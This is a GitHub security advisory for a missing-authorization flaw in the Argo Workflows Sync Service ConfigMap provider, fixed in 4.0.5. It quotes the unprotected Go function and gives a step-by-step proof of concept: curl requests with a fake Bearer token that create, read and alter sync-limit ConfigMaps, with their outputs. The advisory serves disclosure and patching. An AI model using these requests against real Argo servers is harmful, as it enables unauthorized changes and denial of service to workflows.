# [H] Argo has Missing Authorization in its Sync ConfigMap Provider

## Summary
Severity: High
Advisory: GHSA-xchc-cqwg-g76q
CVE: CVE-2026-42297
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:H/SC:N/SI:H/SA:H (CVSS_V4)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-xchc-cqwg-g76q
Type: github-advisory

## Affected
- Go: `github.com/argoproj/argo-workflows/v4` — affected >=4.0.0 <4.0.5

## Details
### Summary
The Sync Service's ConfigMap-backed provider (`server/sync/sync_cm.go`) performs **zero authorization checks** on all CRUD operations (create, read, update, delete). Any authenticated user — including those using fake Bearer tokens — can create, read, update, and delete Kubernetes ConfigMaps containing synchronization limits.

### Details
The ConfigMap-backed provider (`server/sync/sync_cm.go`) has no `auth.CanI` checks:

```go
// sync_cm.go — UNPROTECTED
func (s *configMapSyncProvider) createSyncLimit(ctx context.Context, req *syncpkg.CreateSyncLimitRequest) {
    // NO auth.CanI check
    kubeClient := auth.GetKubeClient(ctx)
    configmapGetter := kubeClient.CoreV1().ConfigMaps(req.Namespace)
    // ... directly creates/updates ConfigMaps
}
```
- `server/sync/sync_cm.go` — lines 23-155
- All four SyncService endpoints: `CreateSyncLimit`, `GetSyncLimit`, `UpdateSyncLimit`, `DeleteSyncLimit`

### PoC
### Prerequisites

- Argo Server running with `--auth-mode=server`
- Port-forward: `kubectl port-forward -n argo svc/argo-server 2746:2746`

### Step 1: Create Sync Limit (Fake Token)

```bash
curl -sk -X POST "https://localhost:2746/api/v1/sync/default" \
  -H "Authorization: Bearer fake-token" \
  -H "Content-Type: application/json" \
  -d '{"type": 0, "namespace": "default", "cmName": "test-sync", "key": "test-key", "limit": 5}'
```

**Result:** `{"namespace":"default","cmName":"test-sync","key":"test-key","limit":5}`

Verify ConfigMap was created in Kubernetes:

```bash
kubectl get configmap test-sync -n default
```

```
NAME        DATA   AGE
test-sync   1      74s
```

### Step 2: Read Sync Limit (Fake Token)

```bash
curl -sk "https://localhost:2746/api/v1/sync/default/test-key?type=0&cmName=test-sync" \
  -H "Authorization: Bearer fake-token"
```

**Result:** `{"namespace":"default","cmName":"test-sync","key":"test-key","limit":5}`

### Step 3: Update Sync Limit (Fake Token)

```bash
curl -sk -X PUT "https://localhost:2746/api/v1/sync/default/test-key" \
  -H "Authorization: Bearer fake-token" \
  -H "Content-Type: application/json" \
  -d '{"type": 0, "namespace": "default", "cmName": "test-sync", "key": "test-key", "limit": 999}'
```

**Result:** `{"namespace":"default","cmName":"test-sync","key":"test-key","limit":999}`

Verify the ConfigMap was actually modified:

```bash
kubectl get configmap test-sync -n default -o jsonpath='{.data.test-key}'
```

```
999
```

### Impact
An attacker with network access to the Argo Server can:

1. **Denial of Service** — Set sync limits to `0` or `1`, blocking all parallel workflow execution
2. **Workflow Disruption** — Modify existing sync limits to break running workflows
3. **Information Disclosure** — Read ConfigMap data that may contain sensitive configuration
4. **Arbitrary ConfigMap Manipulation** — Create/delete ConfigMaps in any namespace accessible to the server's service account

## Related CVEs

- **CVE-2026-28229** (GHSA-56px-hm34-xqj5): Unauthorized access to WorkflowTemplate endpoints — same root cause (missing `auth.CanI` check)
- **CVE-2024-53862** (GHSA-h36c-m3rf-34h9): Archived workflow auth bypass — same pattern

## References
- https://github.com/argoproj/argo-workflows/security/advisories/GHSA-xchc-cqwg-g76q
- https://nvd.nist.gov/vuln/detail/CVE-2026-42297
- https://github.com/argoproj/argo-workflows/commit/09fff05e0830c14a5e36cc40597ad84881db1ab6
- https://github.com/argoproj/argo-workflows
- https://github.com/argoproj/argo-workflows/releases/tag/v4.0.5
